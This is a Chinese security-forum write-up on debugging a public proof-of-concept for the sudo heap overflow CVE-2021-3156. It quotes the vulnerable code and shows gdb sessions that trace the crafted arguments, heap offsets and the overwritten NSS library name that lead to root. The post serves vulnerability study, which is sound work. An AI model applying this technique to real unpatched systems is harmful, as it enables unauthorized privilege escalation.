> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-265906.htm)

在论坛上看到有大佬写了 CVE-2021-3156 的分析，蹭一下热度。

 

本文仅记录我对 CVE-2021-3156 漏洞的调试过程，漏洞分析及利用思路请参考 [Baron Samedit: Heap-based buffer overflow in Sudo (CVE-2021-3156)](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt)，利用代码请参考 [blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)。

 

测试系统为全新的 Ubuntu 20.04.1 虚拟机，sudo 的版本为 1.8.31-1ubuntu1。

 

根据漏洞介绍，此漏洞可以被所有本地用户利用，但是经过测试 [blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156) 只适用于 non-sudoers。所以首先新建一个 test 用户，按照 [blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156) 的介绍编译并运行 PoC。可以看到提权成功。接下来的目标就是结合已有资料，通过调试弄清漏洞利用的具体过程。  
![](https://bbs.pediy.com/upload/tmp/677218_4WUT9CRXHW7JY6V.png)

```
819     if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {
...
852             for (size = 0, av = NewArgv + 1; *av; av++)
853                 size += strlen(*av) + 1;
854             if (size == 0 || (user_args = malloc(size)) == NULL) {
...
857             }
858             if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
...
864                 for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
865                     while (*from) {
866                         if (from[0] == '\\' && !isspace((unsigned char)from[1]))
867                             from++;
868                         *to++ = *from++;
869                     }
870                     *to++ = ' ';
871                 }
...
884             }
...
886     }

```

溢出的原因是在 sudo 处理命令行参数的时候，转译字符`\`使`while (*from)`跳过了后面的`\x00`。[Baron Samedit: Heap-based buffer overflow in Sudo (CVE-2021-3156)](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt) 里面介绍了 3 中利用方法，[blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156) 实现的是 3 种方法中的第二种，即通过一次堆溢出覆盖了`struct service_user`中的`name`字段，从而控制了`__libc_dlopen`的参数，所以可以加载一个攻击者准备的 so 库。

 

为了更好的调试，按照 [ubuntu wiki](https://wiki.ubuntu.com/Debug%20Symbol%20Packages) 中的方法安装符号。

```
$ echo "deb http://ddebs.ubuntu.com $(lsb_release -cs) main restricted universe multiverse
> deb http://ddebs.ubuntu.com $(lsb_release -cs)-updates main restricted universe multiverse
> deb http://ddebs.ubuntu.com $(lsb_release -cs)-proposed main restricted universe multiverse" | \
> sudo tee -a /etc/apt/sources.list.d/ddebs.list

```

```
$ sudo apt install ubuntu-dbgsym-keyring
$ sudo apt-get update
$ sudo apt-get install sudo-dbgsym=1.8.31-1ubuntu1 # 注意要安装对应的版本

```

安装好符号表后开始调试，调试时要使用 root 权限，否则 sudoedit 会报错（我猜是因为`gdb sudo`时 sudo 的 suid 位不起作用）。

```
$ sudo gdb --args ./sudo-hax-me-a-sandwich 1

```

漏洞利用代码做的事情就是准备好环境变量和命令行参数后，通过`execve`执行`sudoedit`。先在`exec`系统调用处断下来，然后用`file`命令将调试的程序改为 sudo，接着在`main`函数下断点。

```
Reading symbols from ./sudo-hax-me-a-sandwich...
(gdb) catch exec
Catchpoint 1 (exec)
(gdb) run
Starting program: /home/weizi/src/CVE-2021-3156/sudo-hax-me-a-sandwich 1
 
** CVE-2021-3156 PoC by blasty using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **
process 2604 is executing new program: /usr/bin/sudo
 
Catchpoint 1 (exec'd /usr/bin/sudo), 0x00007f2035ec7100 in ?? () from /lib64/ld-linux-x86-64.so.2
(gdb) file /usr/bin/sudo
A program is being debugged already.
Are you sure you want to change the file? (y or n) y
Load new symbol table from "/usr/bin/sudo"? (y or n) y
Reading symbols from /usr/bin/sudo...
Reading symbols from /usr/lib/debug/.build-id/c4/3faca825a3d0bf3541ed8e7c64262105da86d9.debug...
(gdb) b main
Breakpoint 2 at 0x5574f6222b20: file ../../src/sudo.c, line 136.
(gdb) c
Continuing.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
 
Breakpoint 2, main (argc=5, argv=0x7ffc20a88cf8, envp=0x7ffc20a88d28) at ../../src/sudo.c:136
136    ../../src/sudo.c: No such file or directory. 
```

在`main`函数断下来之后，可以查看其参数和环境变量，注意命令行参数和环境变量都存储在栈上，而且连续的。

```
(gdb) p argv[0]
$1 = 0x7ffc20a8adf6 "sudoedit"
(gdb) p argv[1]
$2 = 0x7ffc20a8adff "-s"
(gdb) p argv[2]
$3 = 0x7ffc20a8ae02 'A' , "\\"
(gdb) p argv[3]
$4 = 0x7ffc20a8ae3c "\\"
(gdb) p argv[4]
$5 = 0x7ffc20a8ae3e 'B' , "\\"
(gdb) p envp[0]
$6 = 0x7ffc20a8ae76 "\\"
(gdb) p envp[62]
$7 = 0x7ffc20a8aef2 "\\"
(gdb) p envp[63]
$8 = 0x7ffc20a8aef4 "X/P0P_SH3LLZ_"
(gdb) p envp[64]
$9 = 0x7ffc20a8af02 "LC_ALL=C.UTF-8@", 'C' ...
(gdb) p envp[65]
$17 = 0x0
(gdb) 
```

根据 [Baron Samedit: Heap-based buffer overflow in Sudo (CVE-2021-3156)](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt) 的介绍，溢出点在`set_cmnd`函数，但是目前 gdb 里面并没有这个符号。分析后发现`set_cmnd`这个函数在`sudoers.so`这个库里面，但是当前进程中并没有这个库。

```
(gdb) i sharedlibrary
From                To                  Syms Read   Shared Object Library
0x00007f2035ec7100  0x00007f2035ee9674  Yes (*)     /lib64/ld-linux-x86-64.so.2
                                        No          linux-vdso.so.1
0x00007f2035e897e0  0x00007f2035e905a5  Yes (*)     /lib/x86_64-linux-gnu/libaudit.so.1
0x00007f2035e62040  0x00007f2035e794fd  Yes (*)     /lib/x86_64-linux-gnu/libselinux.so.1
0x00007f2035e573e0  0x00007f2035e57d90  Yes         /lib/x86_64-linux-gnu/libutil.so.1
0x00007f2035e40b40  0x00007f2035e4e3ed  Yes         /usr/lib/sudo/libsudo_util.so.0
0x00007f2035c6e630  0x00007f2035de320d  Yes         /lib/x86_64-linux-gnu/libc.so.6
0x00007f2035c43490  0x00007f2035c452d1  Yes (*)     /lib/x86_64-linux-gnu/libcap-ng.so.0
0x00007f2035bb12e0  0x00007f2035c14d8e  Yes (*)     /lib/x86_64-linux-gnu/libpcre2-8.so.0
0x00007f2035baa220  0x00007f2035bab179  Yes         /lib/x86_64-linux-gnu/libdl.so.2
0x00007f2035b8dae0  0x00007f2035b9d4d5  Yes         /lib/x86_64-linux-gnu/libpthread.so.0
(*): Shared library is missing debugging information.

```

猜测这个库是由`dlopen`打开的，因此在`dlopen`下断点，果然看到了`dlopen`打开`sudoers.so`，并且`set_cmnd`的符号出现了。

```
gdb) b dlopen
Breakpoint 3 at 0x7f2035baa390: file dlopen.c, line 75.
(gdb) c
Continuing.
 
Breakpoint 3, __dlopen (file=file@entry=0x7ffc20a879d0 "/usr/lib/sudo/sudoers.so", mode=257) at dlopen.c:75
75    dlopen.c: No such file or directory.
(gdb) finish
Run till exit from #0  __dlopen (file=file@entry=0x7ffc20a879d0 "/usr/lib/sudo/sudoers.so", mode=257) at dlopen.c:75
0x00005574f622f0f3 in sudo_load_plugin (policy_plugin=policy_plugin@entry=0x5574f62467e0 , info=info@entry=0x5574f731ba40, io_plugins=,
    io_plugins=) at ../../src/load_plugins.c:178
178    ../../src/load_plugins.c: No such file or directory.
Value returned is $10 = (void *) 0x5574f731bb20
(gdb) b set_cmnd
Breakpoint 4 at 0x7f2035409fd3: file ../../../plugins/sudoers/sudoers.c, line 804. 
```

在`set_cmnd`断下来之后你会发现这个函数被内联了，通过汇编可以看出分配内存是在`sudoers_policy_main+771`，所以在此处下断点，查看`malloc`的参数和返回值。可以看到分配内存的大小为`0x74`，返回值为`0x5574f731a350`。

```
Breakpoint 4, set_cmnd () at ../../../plugins/sudoers/sudoers.c:804
804    ../../../plugins/sudoers/sudoers.c: No such file or directory.
(gdb) b *(sudoers_policy_main+771)
Breakpoint 5 at 0x7f203540a133: file ../../../plugins/sudoers/sudoers.c, line 854.
(gdb) c
Continuing.
 
Breakpoint 5, 0x00007f203540a133 in set_cmnd () at ../../../plugins/sudoers/sudoers.c:854
854    in ../../../plugins/sudoers/sudoers.c
(gdb) i r rdi
rdi            0x74                116
(gdb) ni
0x00007f203540a138    854    in ../../../plugins/sudoers/sudoers.c
(gdb) i r rax
rax            0x5574f731a350      93960851792720
(gdb) x/s 0x5574f731a350+176
0x5574f731a400:    "files"

```

`0x74`这个值是三个命令行参数`AAAA...AA\` `\` `BBBB..BB\`的长度加上 3（每个参数后面有一个空格或 null）。根据命令行参数的长度和环境变量的长度，可以算出`X/P0P_SH3LLZ_`相对`0x5574f731a350`的偏移是`57+55+1+63=176`。当前的内容为`files`，在`nss_load_library`下断点，再检查`0x5618c8419350+176`的值为`X/P0P_SH3LLZ_`，在`__libc_dlopen_mode`下断点，可以看到进程在打开`libnss_X/P0P_SH3LLZ_ .so.2`。

```
(gdb) b nss_load_library
Breakpoint 6 at 0x7f2035d8f4c0: file nsswitch.c, line 329.
(gdb) c
Continuing.
 
Breakpoint 6, nss_load_library (ni=ni@entry=0x5574f731a3d0) at nsswitch.c:329
329    nsswitch.c: No such file or directory.
(gdb) x/s 0x5574f731a350+176
0x5574f731a400:    "X/P0P_SH3LLZ_ "
(gdb) p *ni
$11 = {next = 0x0, actions = {NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE}, library = 0x0, known = 0x5574f731f770,
  name = 0x5574f731a400 "X/P0P_SH3LLZ_ "}
(gdb) b __libc_dlopen_mode
Breakpoint 7 at 0x7f2035dab930: file dl-libc.c, line 186.
(gdb) c
Continuing.
 
Breakpoint 7, __GI___libc_dlopen_mode (name=name@entry=0x7ffc20a88160 "libnss_X/P0P_SH3LLZ_ .so.2", mode=mode@entry=-2147483646) at dl-libc.c:186
186    dl-libc.c: No such file or directory.

```

[[公告] 推荐好文功能上线，分享知识还可以得雪币！推荐一篇文章获得 20 雪币！](https://zhuanlan.kanxue.com/article-external_link.htm)